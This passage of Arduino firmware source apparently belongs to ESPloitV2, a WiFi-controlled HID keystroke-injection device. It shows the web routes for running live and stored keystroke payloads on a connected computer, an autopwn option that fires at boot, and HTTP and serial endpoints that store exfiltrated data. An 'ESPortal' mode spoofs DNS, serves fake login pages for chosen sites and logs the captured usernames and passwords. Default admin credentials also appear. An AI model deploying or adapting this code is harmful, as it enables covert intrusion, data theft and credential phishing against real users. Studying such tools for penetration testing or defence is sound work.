 * setup() - Initialize hardware, load config, register all HTTP routes
 * ============================================================================
 * Route map:
 *   /style.css         - Shared CSS theme (PROGMEM, cached 24h)
 *   / or /esploit      - Dashboard (icon grid, storage stats)
 *   /settings          - Configuration form (GET=view, POST=save)
 *   /firmware           - Firmware version check + OTA upload iframe
 *   /autoupdatefirmware - One-click OTA from legacysecuritygroup.com
 *   /livepayload        - Live payload editor (textarea + run)
 *   /runlivepayload     - Execute live payload via serial to 32u4
 *   /listpayloads       - Payload file listing with run/download/delete
 *   /uploadpayload      - File upload form
 *   /upload (POST)      - Handle multipart file upload to /payloads/
 *   /showpayload        - View payload/exfil file contents
 *   /dopayload          - Execute a stored payload file
 *   /deletepayload      - Confirm + delete a file
 *   /format             - Confirm + format SPIFFS
 *   /reboot             - Reboot device
 *   /restoredefaults    - Confirm + reset to factory config
 *   /exfiltrate         - HTTP exfiltration endpoint (GET with file+data)
 *   /exfiltrate/list    - List exfiltrated data files
 *   /help               - Documentation page (PROGMEM)
 *   /license            - MIT license text (PROGMEM)
 *   /inputmode          - HID keyboard/mouse control (PROGMEM)
 *   /duckuino           - DuckyScript converter (PROGMEM)
 *   /validate           - ESPortal credential capture endpoint
 *
 * ESPortal mode (when enabled):
 *   - Main UI moves to /esploit, root becomes captive portal
 *   - DNS server spoofs all domains to device IP
 *   - 404 handler redirects to configured spoof pages
 *   - Custom templates loaded from SPIFFS if present
 * ============================================================================
 */
void setup(void)
{
//  SOFTserial.begin(38400);
//  Serial.begin(115200);
//  Serial.println("");
//  Serial.println("ESPloit - Wifi Controlled HID Keyboard Emulator");
//  Serial.println("");
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  Serial.begin(38400);
  SPIFFS.begin();
  
 // loadDefaults(); //uncomment to restore default settings if double reset fails for some reason
 /*
  if (drd.detectDoubleReset()) {
    Serial.println("Double Reset Detected");
    loadDefaults();
  }
  */
  
  loadConfig();

//Set up Web Pages
  char rootdir[10];
  if (esportalenabled==1){
    String("/esploit").toCharArray(rootdir,10);
  }
  else {
    String("/").toCharArray(rootdir,10);
    server.on("/esploit",[]() {
      server.sendHeader("Location", String("/"), true);
      server.send ( 302, "text/plain", "");
    });
  }
  server.on(rootdir,[]() {
    FSInfo fs_info;
    SPIFFS.info(fs_info);
    String total;
    total=fs_info.totalBytes;
    String used;
    used=fs_info.usedBytes;
    String freespace;
    freespace=fs_info.totalBytes-fs_info.usedBytes;
    if (ardversion == "") {
      ardversion = "2.0(Guessing)";
      Serial.println("GetVersion:X"); //check 32u4 version info
    }
    server.send(200, "text/html", String()+F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><title>ESPloit Dashboard</title><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">ESPloit v")+version+F("</span><a href=\"/settings\">Settings</a><a href=\"/firmware\">Firmware</a><a href=\"/help\">Help</a></div><div class=\"card\"><div class=\"stat\"><span>Storage: <b>")+total+F("</b> B total</span><span><b>")+freespace+F("</b> B free</span><span><b>")+used+F("</b> B used</span></div></div><div class=\"grid\"><div class=\"gi\"><a href=\"/livepayload\"><div class=\"ico\">&#9889;</div>Live Payload<div class=\"lbl\">Real-time injection</div></a></div><div class=\"gi\"><a href=\"/inputmode\"><div class=\"ico\">&#9000;</div>Input Mode<div class=\"lbl\">Keyboard &amp; Mouse</div></a></div><div class=\"gi\"><a href=\"/duckuino\"><div class=\"ico\">&#128196;</div>Duckuino<div class=\"lbl\">Script converter</div></a></div><div class=\"gi\"><a href=\"/listpayloads\"><div class=\"ico\">&#128203;</div>Payloads<div class=\"lbl\">List &amp; manage</div></a></div><div class=\"gi\"><a href=\"/uploadpayload\"><div class=\"ico\">&#128228;</div>Upload<div class=\"lbl\">Upload payload</div></a></div><div class=\"gi\"><a href=\"/exfiltrate/list\"><div class=\"ico\">&#128230;</div>Exfiltration<div class=\"lbl\">View captured data</div></a></div><div class=\"gi\"><a href=\"/format\"><div class=\"ico\">&#128165;</div>Format<div class=\"lbl\">Erase file system</div></a></div><div class=\"gi\"><a href=\"/settings\"><div class=\"ico\">&#9881;</div>Settings<div class=\"lbl\">Configure device</div></a></div><div class=\"gi\"><a href=\"/firmware\"><div class=\"ico\">&#128260;</div>Firmware<div class=\"lbl\">Update firmware</div></a></div><div class=\"gi\"><a href=\"/help\"><div class=\"ico\">&#10067;</div>Help<div class=\"lbl\">Documentation</div></a></div></div><div class=\"card\" style=\"text-align:center\"><small>ESPloitV2 by Corey Harding &mdash; LegacySecurityGroup.com / Exploit.Agency</small></div></body></html>"));
  });
  if (esportalenabled==1){
  
    server.onNotFound([]() {
      String responseHTML = String()+
      F(
      ""
      "<!DOCTYPE html>"
      "<html>"
      "<body>"
      "<script>"
      "if (document.domain==\"")+local_IPstr+F("\"||document.domain==\"go.microsoft.com\"||document.domain==\"detectportal.firefox.com\")"
      "{"
      "window.open(\"http://")+welcome_domain+welcome_redirect+F("\",\"_self\");"
      "}"
      "else if (document.domain==\"")+site1_domain+F("\"||document.domain==\"www.")+site1_domain+F("\"||document.domain==\"mobile.")+site1_domain+F("\")"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site1_redirect+F("\",\"_self\");"
      "}"
      "else if (document.domain==\"")+site2_domain+F("\"||document.domain==\"www.")+site2_domain+F("\"||document.domain==\"mobile.")+site2_domain+F("\")"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site2_redirect+F("\",\"_self\");"
      "}"
      "else if (document.domain==\"")+site3_domain+F("\"||document.domain==\"www.")+site3_domain+F("\"||document.domain==\"mobile.")+site3_domain+F("\")"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site3_redirect+F("\",\"_self\");"
      "}"
      "else"
      "{"
      "window.open(\"http://\"+document.domain+\"")+site_other_redirect+F("\",\"_self\");"
      "}"
      "</script>"
      "<body>"
      "</html>");
      if (!RawFile(server.uri())){
        File f = SPIFFS.open("/captiveportal.html", "r");
          if (f) {
           server.streamFile(f, "text/html");
         }
          else {
           server.send(200, "text/html", responseHTML);
         }
        f.close();
      }
    });
  
    //Portal welcome page
    server.on(welcome_redirect,[]() {
        File f = SPIFFS.open("/welcome.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", PORTAL_LOGIN_HTML);
          }
        f.close();
    });
    
    //generic catch all login page for domains not listed in configuration
    server.on(site_other_redirect,[]() {
        File f = SPIFFS.open("/spoof_other.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE_OTHER_HTML);
          }
        f.close();
    });
  
    //SITE1 login page
    server.on(site1_redirect,[]() {
        File f = SPIFFS.open("/spoof_site1.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE1_HTML);
          }
        f.close();
    });
  
    //SITE2 login page
    server.on(site2_redirect,[]() {
        File f = SPIFFS.open("/spoof_site2.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE2_HTML);
          }
        f.close();
    });
  
    //SITE3 login page
    server.on(site3_redirect,[]() {
        File f = SPIFFS.open("/spoof_site3.html", "r");
          if (f) {
            server.streamFile(f, "text/html");
          }
          else {
            server.send_P(200, "text/html", SITE3_HTML);
          }
        f.close();
    });
    
    server.on("/validate", []() {
      String url = server.arg("url");
      String user = server.arg("user");
      String pass = server.arg("pass");
      File f = SPIFFS.open("/esportal-log.txt", "a");
      f.print(url);
      f.print(":");
      f.print(user);
      f.print(":");
      f.println(pass);
      f.close();
      File f2 = SPIFFS.open("/error.html", "r");
        if (f2) {
          server.streamFile(f2, "text/html");
        }
        else {
          server.send(200, "text/html", F("HTTP Error 500 Internal server error"));
        }
      f2.close();
    });
  }
  else {
    server.onNotFound([]() {
    if (!RawFile(server.uri()))
      server.send(404, "text/plain", F("Error 404 File Not Found"));
    });
  }
  
  // Serve shared CSS theme from PROGMEM with 24-hour browser cache
  server.on("/style.css", []() {
    server.sendHeader("Cache-Control", "public, max-age=86400");
    server.send_P(200, "text/css", CSS);
  });

  server.on("/settings", handleSettings);

  server.on("/firmware", [](){
    latestversion = "";
    http.begin("http://legacysecuritygroup.com/esploit.php");
    int httpCode = http.GET();
    if (httpCode > 0) {
      latestversion = http.getString();
    }
    http.end();
    String ardupdate;
    
    if (ardversion=="") {
      ardupdate="Could not fetch 32u4 version.<br>Return to the main menu then click on \"Upgrade ESPloit Firmware\"";
    }
    else if (ardversion.startsWith(latestardversion)) {
      ardupdate="32u4 Firmware is up to date.";
    }
    else if (ardversion!=latestardversion) {
      ardupdate="32u4 Firmware needs to be manually updated!";
    }
    else {
      ardupdate="Something went wrong...";
    }
    
    String fwPage = String()+F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><title>Firmware</title><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">Firmware</span><a href=\"/esploit\">Dashboard</a><a href=\"/help\">Help</a></div><div class=\"card\"><h2>Version Info</h2><table><tr><th>Component</th><th>Installed</th><th>Latest</th></tr><tr><td>32u4 Firmware</td><td>")+ardversion+F("</td><td>")+latestardversion+F("</td></tr><tr><td>ESP Firmware</td><td>")+version+F("</td><td>");
    if (version == latestversion && latestversion != "") {
      fwPage += latestversion+F("</td></tr></table><div class=\"success\">")+ardupdate+F("<br>ESP Firmware is up to date.</div></div>");
    }
    else if (version != latestversion && latestversion != "") {
      fwPage += latestversion+F("</td></tr></table><div class=\"warn\">")+ardupdate+F("<br>ESP update available.</div><a href=\"/autoupdatefirmware\" target=\"iframe\" class=\"btn btn-p\">Auto-Update ESP Firmware</a></div>");
    }
    else if (httpCode < 0) {
      fwPage += F("?</td></tr></table><div class=\"warn\">")+ardupdate+F("<br>Could not connect to update server.</div></div>");
    }
    fwPage += String()+F("<div class=\"card\"><h2>Manual Upload</h2><iframe name=\"iframe\" style=\"border:0;width:100%;height:80px\" src=\"http://")+local_IPstr+F(":1337/update\"></iframe><small>Download latest from <a href=\"https://github.com/exploitagency/ESPloitV2\" target=\"_blank\">GitHub</a>. Upload <code>ESP_Code.ino.generic.bin</code> above. Update 32u4 via Arduino IDE. See <a href=\"/help\">help</a>.</small></div></body></html>");
    server.send(200, "text/html", fwPage);
  });

  server.on("/autoupdatefirmware", [](){
    if(!server.authenticate(update_username, update_password))
    return server.requestAuthentication();
    server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"warn\">Upgrading firmware... Device will reboot automatically.</div></body></html>"));
    ESPhttpUpdate.update("http://legacysecuritygroup.com/esploit.php?tag=" + version);
  });
  
  server.on("/livepayload", [](){
    server.send(200, "text/html", String()+F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><title>Live Payload</title><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">Live Payload</span><a href=\"/esploit\">Dashboard</a><a href=\"/listpayloads\">Payloads</a><a href=\"/uploadpayload\">Upload</a></div><div class=\"card\"><h2>Execute Live Payload</h2><FORM action=\"/runlivepayload\" method=\"post\" id=\"live\" target=\"iframe\"><label>ESPloit Script</label><textarea form=\"live\" name=\"livepayload\" rows=\"8\" placeholder=\"Enter payload script...\"></textarea><br><INPUT type=\"radio\" name=\"livepayloadpresent\" value=\"1\" hidden=\"1\" checked=\"checked\"><div class=\"flex mt\"><INPUT type=\"submit\" value=\"Run Payload\"> <a href=\"/duckuino\" class=\"btn\">Duckuino Converter</a></div></FORM></div><iframe name=\"iframe\" src=\"http://")+local_IPstr+F("/runlivepayload\"></iframe></body></html>"));
  });


  server.on("/runlivepayload", [](){
    String livepayload;
    livepayload += server.arg("livepayload");
    if (server.hasArg("livepayloadpresent")) {
      server.send(200, "text/html", "<!DOCTYPE HTML><html><head><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"success\">Running live payload...</div><pre>"+livepayload+"</pre></body></html>");
      char* splitlines;
      int payloadlen = livepayload.length()+1;
      char request[payloadlen];
      livepayload.toCharArray(request,payloadlen);
      splitlines = strtok(request,"\r\n");
      int defaultdelay = DelayLength;
      int settingsdefaultdelay = DelayLength;
      int custom_delay;
      delay(livepayloaddelay);
      while(splitlines != NULL)
      {
         String liveline=splitlines;
         liveline.replace("&lt;", "<");
         char *i;
         String cmd;
         String cmdinput;
         cmd = String(strtok_r(splitlines,":",&i));

//         Serial.println(String()+"cmd:"+cmd);
//         Serial.println(String()+"cmdin:"+cmdinput);
         
         splitlines = strtok(NULL,"\r\n");
         
         if(cmd == "Rem") {
           cmdinput = String(strtok_r(NULL,":",&i));
           DelayLength = 0;
         }
         
         else if(cmd == "DefaultDelay") {
           cmdinput = String(strtok_r(NULL,":",&i));
           DelayLength = 1500;
           String newdefaultdelay = cmdinput;
           defaultdelay = newdefaultdelay.toInt();
 //          Serial.println(String()+"default delay set to:"+defaultdelay);
         }
         else if(cmd == "BlinkLED") {
           cmdinput = String(strtok_r(NULL,":",&i));
           int blinkcount = cmdinput.toInt();
           for (int i=1; i <= blinkcount; i++){
             digitalWrite(LED_BUILTIN, LOW);
             delay(750);
             digitalWrite(LED_BUILTIN, HIGH);
             delay(500);
           }
         }
         else if(cmd == "CustomDelay") {
           cmdinput = String(strtok_r(NULL,":",&i));
           String customdelay = cmdinput;
           custom_delay = customdelay.toInt();
           DelayLength = custom_delay;
 //          Serial.println(String()+"Custom delay set to:"+custom_delay);
         }
 //        Serial.println(DelayLength);
         else {
           Serial.println(liveline);
         }

         delay(DelayLength); //delay between lines in payload, I found running it slower works best
         DelayLength = defaultdelay;  
      }
      DelayLength = settingsdefaultdelay;
      return 0;
    }
    else {
      server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"info\">Type or paste a payload and click &quot;Run Payload&quot;.</div></body></html>"));
    }
  });

  server.on("/restoredefaults", [](){
    server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">Restore Defaults</span><a href=\"/esploit\">Dashboard</a></div><div class=\"card\"><div class=\"warn\">This will restore the device to the default configuration. All settings will be lost.</div><div class=\"flex mt\"><a href=\"/restoredefaults/yes\" class=\"btn btn-d\">Yes, Restore Defaults</a> <a href=\"/esploit\" class=\"btn\">Cancel</a></div></div></body></html>"));
  });

  server.on("/restoredefaults/yes", [](){
    if(!server.authenticate(update_username, update_password))
      return server.requestAuthentication();
    server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">ESPloit</span><a href=\"/esploit\">Dashboard</a></div><div class=\"success\">Defaults restored. Device rebooting...</div><div class=\"card\"><h2>Default Credentials</h2><table><tr><th>Setting</th><th>Value</th></tr><tr><td>SSID</td><td><b>Exploit</b></td></tr><tr><td>WiFi Password</td><td><b>DotAgency</b></td></tr><tr><td>Admin User</td><td><b>admin</b></td></tr><tr><td>Admin Password</td><td><b>hacktheplanet</b></td></tr></table></div></body></html>"));
    loadDefaults();
    ESP.restart();
  });

  server.on("/deletepayload", [](){
    String deletepayload;
    deletepayload += server.arg(0);
    server.send(200, "text/html", "<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">Delete File</span><a href=\"/esploit\">Dashboard</a></div><div class=\"card\"><div class=\"warn\">This will permanently delete: <code>"+deletepayload+"</code></div><div class=\"flex mt\"><a href=\"/deletepayload/yes?payload="+deletepayload+"\" class=\"btn btn-d\">Yes, Delete</a> <a href=\"/esploit\" class=\"btn\">Cancel</a></div></div></body></html>");
  });

  server.on("/deletepayload/yes", [](){
    if(!server.authenticate(update_username, update_password))
      return server.requestAuthentication();
    String deletepayload;
    deletepayload += server.arg(0);
    if (deletepayload.startsWith("/payloads/")) server.send(200, "text/html", String()+F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">ESPloit</span><a href=\"/esploit\">Dashboard</a><a href=\"/listpayloads\">Payloads</a></div><div class=\"success\">Deleted: <code>")+deletepayload+F("</code></div></body></html>"));
    if (!deletepayload.startsWith("/payloads/")) server.send(200, "text/html", String()+F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">ESPloit</span><a href=\"/esploit\">Dashboard</a><a href=\"/exfiltrate/list\">Exfiltrated Data</a></div><div class=\"success\">Deleted: <code>")+deletepayload+F("</code></div></body></html>"));
    SPIFFS.remove(deletepayload);
  });

  server.on("/format", [](){
    server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">Format SPIFFS</span><a href=\"/esploit\">Dashboard</a></div><div class=\"card\"><div class=\"warn\">This will reformat the SPIFFS file system. <b>All payloads and exfiltrated data will be permanently deleted.</b></div><div class=\"flex mt\"><a href=\"/format/yes\" class=\"btn btn-d\">Yes, Format</a> <a href=\"/esploit\" class=\"btn\">Cancel</a></div></div></body></html>"));
  });

  server.on("/exfiltrate", [](){
    String file = server.arg("file");
    String data = server.arg("data");
    // open the file in write mode
    String truncatedname = file.substring(0,30);
    File f = SPIFFS.open(String("/"+truncatedname), "w");
    f.println(data);
    f.close();
  });

  server.on("/exfiltrate/list", ListPayloads);

  server.on("/reboot", [](){
    if(!server.authenticate(update_username, update_password))
    return server.requestAuthentication();
    server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">ESPloit</span><a href=\"/esploit\">Dashboard</a></div><div class=\"warn\">Rebooting ESPloit... Please wait and reconnect.</div></body></html>"));
    ESP.restart();
  });
  
  server.on("/format/yes", [](){
    if(!server.authenticate(update_username, update_password))
      return server.requestAuthentication();
    server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">ESPloit</span><a href=\"/esploit\">Dashboard</a></div><div class=\"warn\">Formatting file system... This may take up to 90 seconds.</div></body></html>"));
//    Serial.print("Formatting file system...");
    SPIFFS.format();
//    Serial.println(" Success");
    saveConfig();
  });
    
  server.on("/uploadpayload", []() {
    server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><title>Upload Payload</title><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">Upload Payload</span><a href=\"/esploit\">Dashboard</a><a href=\"/listpayloads\">Payloads</a><a href=\"/livepayload\">Live Mode</a></div><div class=\"card\"><h2>Upload Payload File</h2><form method=\"POST\" action=\"/upload\" enctype=\"multipart/form-data\"><div class=\"mb\"><input type=\"file\" name=\"upload\" multiple></div><input type=\"submit\" value=\"Upload\"></form></div></body></html>"));
  });
    
  server.on("/listpayloads", ListPayloads);
    
  server.onFileUpload(handleFileUpload);
    
  server.on("/upload", HTTP_POST, []() {
    server.send(200, "text/html", F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">ESPloit</span><a href=\"/esploit\">Dashboard</a></div><div class=\"success\">Upload successful!</div><div class=\"flex\"><a href=\"/listpayloads\" class=\"btn btn-p\">View Payloads</a> <a href=\"/uploadpayload\" class=\"btn\">Upload Another</a></div></body></html>"));
  });

  server.on("/help", []() {
    server.send_P(200, "text/html", HelpText);
  });
  
  server.on("/license", []() {
    server.send_P(200, "text/html", License);
  });

  server.on("/inputmode", []() {
    server.send_P(200, "text/html", InputModePage);
  });

  server.on("/duckuino", []() {
    server.send_P(200, "text/html", Duckuino);
  });
    
  server.on("/showpayload", ShowPayloads);

  server.on("/dopayload", [](){
    String dopayload;
    dopayload += server.arg(0);
    server.send(200, "text/html", String()+F("<!DOCTYPE HTML><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\" href=\"/style.css\"></head><body><div class=\"nav\"><span class=\"brand\">ESPloit</span><a href=\"/esploit\">Dashboard</a><a href=\"/listpayloads\">Payloads</a></div><div class=\"success\">Running payload: <code>")+dopayload+F("</code></div><div class=\"info\">This may take a while to complete...</div></body></html>"));
//    Serial.println("Running payaload: "+dopayload);
    File f = SPIFFS.open(dopayload, "r");
    int defaultdelay = DelayLength;
    int settingsdefaultdelay = DelayLength;
    int custom_delay;
    while(f.available()) {
//      SOFTserial.println(line);
//      Serial.println(line);
      String line = f.readStringUntil('\n');
      line.replace("&lt;", "<");

      String fullkeys = line;
      int str_len = fullkeys.length()+1; 
      char keyarray[str_len];
      fullkeys.toCharArray(keyarray, str_len);

      char *i;
      String cmd;
      String cmdinput;
      cmd = String(strtok_r(keyarray,":",&i));

//         Serial.println(String()+"cmd:"+cmd);
//         Serial.println(String()+"cmdin:"+cmdinput);
     
      if(cmd == "Rem") {
        cmdinput = String(strtok_r(NULL,":",&i));
        DelayLength = 0;
      }
      
      else if(cmd == "DefaultDelay") {
        cmdinput = String(strtok_r(NULL,":",&i));
        DelayLength = 1500;
        String newdefaultdelay = cmdinput;
        defaultdelay = newdefaultdelay.toInt();
//          Serial.println(String()+"default delay set to:"+defaultdelay);
      }
      else if(cmd == "BlinkLED") {
        cmdinput = String(strtok_r(NULL,":",&i));
        int blinkcount = cmdinput.toInt();
        for (int i=1; i <= blinkcount; i++){
          digitalWrite(LED_BUILTIN, LOW);
          delay(750);
          digitalWrite(LED_BUILTIN, HIGH);
          delay(500);
        }
      }
      else if(cmd == "CustomDelay") {
        cmdinput = String(strtok_r(NULL,":",&i));
        String customdelay = cmdinput;
        custom_delay = customdelay.toInt();
        DelayLength = custom_delay;
//          Serial.println(String()+"Custom delay set to:"+custom_delay);
      }
      else {
        Serial.println(line);
      }
//        Serial.println(DelayLength);
      delay(DelayLength); //delay between lines in payload, I found running it slower works best
      DelayLength = defaultdelay;
    }
    f.close();
    DelayLength = settingsdefaultdelay;
  });
  
  server.begin();
  WiFiClient client;
  client.setNoDelay(1);

//  Serial.println("Web Server Started");

  MDNS.begin("ESPloit");

  httpUpdater.setup(&httpServer, update_path, update_username, update_password);
  httpServer.begin();

  MDNS.addService("http", "tcp", 1337);
  if (esportalenabled==1){
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  }
  
  if (ftpenabled==1){
    ftpSrv.begin(String(ftp_username),String(ftp_password));
  }
  
  if (autopwn==1){
    runpayload();
  }
  
}

/* loop() - Main event loop
 * Handles: FTP server, HTTP requests, DNS (ESPortal), serial commands from 32u4
 * Serial protocol: "Command:Data\n" - supports ResetDefaultConfig, Version,
 * SerialEXFIL (saves to /SerialEXFIL.txt), and BlinkLED */
void loop() {
  if (ftpenabled==1){
    ftpSrv.handleFTP();
  }
  server.handleClient();
  httpServer.handleClient();
  if (esportalenabled==1){
    dnsServer.processNextRequest();
  }
//  drd.loop();
  while (Serial.available()) {
    String cmd = Serial.readStringUntil(':');
        if(cmd == "ResetDefaultConfig"){
          String RSDC = Serial.readStringUntil('\n');
          if(RSDC.indexOf("OpenNetwork") >=0) {
            open_network=1;
          }
          else {
            open_network=0;
          }
          loadDefaults();
          ESP.restart();
        }
        //check 32u4 version info
        else if(cmd == "Version"){
          ardversion = Serial.readStringUntil('\n');
        }
        else if(cmd == "SerialEXFIL"){
          String SerialEXFIL = Serial.readStringUntil('\n');
          File f = SPIFFS.open("/SerialEXFIL.txt", "a");
          f.println(SerialEXFIL);
          f.close();
        }
        else if(cmd == "BlinkLED") {
          String cmdinput = Serial.readStringUntil('\n');
          int blinkcount = cmdinput.toInt();
          for (int i=1; i <= blinkcount; i++){
            digitalWrite(LED_BUILTIN, LOW);
            delay(750);
            digitalWrite(LED_BUILTIN, HIGH);
            delay(500);
          }
        }
  }
  
  //Serial.print("Free heap-");
  //Serial.println(ESP.getFreeHeap(),DEC);
}
